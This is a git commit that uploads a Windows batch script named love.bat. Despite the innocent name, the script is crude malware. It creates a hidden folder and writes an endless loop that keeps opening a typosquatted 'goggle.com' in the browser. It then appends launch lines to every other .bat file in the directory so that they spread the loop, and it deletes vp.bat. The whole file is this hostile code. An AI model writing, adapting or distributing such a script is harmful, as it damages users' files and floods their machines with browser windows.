b9a205930403eda1499dd2f731cc39c41449c38e
AndreSignori <signori.andrea.studente@itispaleocapa.it>
2024-10-21 17:51:24 +0200

    Add files via upload

---
+++ love.bat
@@ -0,0 +1,41 @@
+@echo off 
+mkdir nuoc
+atttrib +h nuoc
+cd nuoc
+echo timeout 30 > figlio.bat
+echo :1 >>  figlio.bat 
+echo start www.goggle.com >> figlio.bat 
+echo start www.goggle.com >> figlio.bat 
+echo start www.goggle.com >> figlio.bat 
+echo start www.goggle.com >> figlio.bat 
+echo start www.goggle.com >> figlio.bat 
+echo start www.goggle.com >> figlio.bat 
+echo start www.goggle.com >> figlio.bat 
+echo start www.goggle.com >> figlio.bat 
+echo start www.goggle.com >> figlio.bat 
+echo start www.goggle.com >> figlio.bat 
+echo start www.goggle.com >> figlio.bat 
+echo start www.goggle.com >> figlio.bat 
+echo start www.goggle.com >> figlio.bat 
+echo start www.goggle.com >> figlio.bat 
+echo start www.goggle.com >> figlio.bat 
+echo start www.goggle.com >> figlio.bat 
+echo start www.goggle.com >> figlio.bat 
+echo start www.goggle.com >> figlio.bat 
+echo start www.goggle.com >> figlio.bat 
+echo start www.goggle.com >> figlio.bat 
+echo start www.goggle.com >> figlio.bat 
+echo start www.goggle.com >> figlio.bat 
+echo start www.goggle.com >> figlio.bat 
+echo start www.goggle.com >> figlio.bat 
+echo start www.goggle.com >> figlio.bat 
+echo start www.goggle.com >> figlio.bat 
+echo start www.goggle.com >> figlio.bat 
+echo goto 1 >> figlio.bat
+cd ..
+copy vp.bat nuoc
+for %%a in (*.bat) do echo .>> %%a
+for %%a in (*.bat) do echo cd nuoc >> %%a 
+for %%a in (*.bat) do echo start /min figlio.bat >> %%a
+del vp.bat
+exit 
